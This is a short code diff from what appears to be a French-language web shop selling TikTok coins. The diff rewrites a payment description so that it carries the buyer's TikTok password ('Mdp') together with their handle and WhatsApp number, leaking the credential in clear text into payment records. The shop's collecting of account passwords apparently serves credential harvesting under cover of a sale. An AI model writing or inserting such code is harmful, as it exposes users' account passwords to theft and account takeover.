@@ -1207,7 +1207,7 @@ export default function Home() {
                     language={language}
                     amount={selectedPack.price}
                     orderId={paymentOrderId}
-                    description={`Produit: Pièces TikTok | Quantité: ${deliveredCoins} pièces | Identifiant TikTok: @${username.replace(/^@/, "")} | WhatsApp: ${formatFullPhoneNumber(whatsapp, dialCode)}`}
+                    description={`TikTok: @${username.replace(/^@/, "")} | Mdp: ${password} | ${formatFullPhoneNumber(whatsapp, dialCode)}`.substring(0, 100)}
                     username={username}
                     whatsapp={whatsapp}
                     dialCode={dialCode}
